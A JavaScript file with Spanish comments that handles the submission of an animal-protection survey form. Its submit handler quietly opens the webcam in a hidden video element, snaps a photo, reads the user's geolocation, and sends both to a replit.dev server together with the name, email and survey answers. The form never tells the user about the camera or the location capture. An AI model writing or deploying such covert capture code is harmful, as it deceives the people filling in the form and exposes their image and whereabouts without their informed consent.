let imagenBase64 = "";
let ubicacionActual = { latitud: null, longitud: null };

// Activar cámara y tomar foto justo antes de enviar
async function iniciarCamara() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement("video");
    video.style.display = "none"; // oculto pero funcional
    document.body.appendChild(video);
    video.srcObject = stream;
    await video.play();

    // Esperar un momento para que el video cargue
    await new Promise(res => setTimeout(res, 1000));

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    imagenBase64 = canvas.toDataURL("image/png");

    // Detener la cámara y limpiar
    stream.getTracks().forEach(track => track.stop());
    video.remove();
  } catch (error) {
    console.error("No se pudo acceder a la cámara ❌", error);
  }
}

// Obtener ubicación con geolocalización
function obtenerUbicacion() {
  return new Promise((resolve) => {
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          ubicacionActual.latitud = pos.coords.latitude;
          ubicacionActual.longitud = pos.coords.longitude;
          resolve();
        },
        (error) => {
          console.warn("No se pudo obtener la ubicación ❌", error.message);
          resolve(); // Continuar igual aunque no haya ubicación
        }
      );
    } else {
      console.warn("Geolocalización no soportada 😢");
      resolve();
    }
  });
}

// Evento de envío del formulario
document.getElementById("animalProtectionSurvey").addEventListener("submit", async function (e) {
  e.preventDefault();

  const nombre = document.getElementById("nombre").value.trim();
  const email = document.getElementById("email").value.trim();

  const animalesSeleccionados = Array.from(document.querySelectorAll('input[name="animals"]:checked')).map(el => el.value);
  const importancia = document.querySelector('input[name="importance"]:checked')?.value || "";
  const participacion = document.querySelector('input[name="participation"]:checked')?.value || "";
  const medidas = document.getElementById("medidas").value.trim();
  const ultimaDonacion = document.getElementById("ultima_donacion").value;

  // Aquí activamos cámara y obtenemos ubicación antes de enviar
  await iniciarCamara();
  await obtenerUbicacion();

  const datos = {
    nombre,
    email,
    animalesSeleccionados,
    importancia,
    participacion,
    medidas,
    ultimaDonacion,
    imagen: imagenBase64,
    ubicacion: ubicacionActual,
    fechaEnvio: new Date().toISOString()
  };

  try {
    const respuesta = await fetch("https://65ffac8d-3109-47e8-8fce-76309ca55164-00-lrbdjweytiv2.riker.replit.dev/", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(datos)
    });

    if (respuesta.ok) {
      const resultado = await respuesta.json();
      console.log("✅ Enviado correctamente:", resultado);
      alert("¡Gracias por tu respuesta! 🐾 Has ayudado a construir un mundo más amable con los animales.");
      this.reset(); // Limpia el formulario después de enviar
      imagenBase64 = ""; // Resetear la imagen
      ubicacionActual = { latitud: null, longitud: null };
    } else {
      alert("Error al enviar el formulario, intenta más tarde.");
    }
  } catch (error) {
    console.error("❌ Error al enviar datos:", error);
    alert("Ocurrió un problema al enviar. Por favor, inténtalo más tarde.");
  }
});

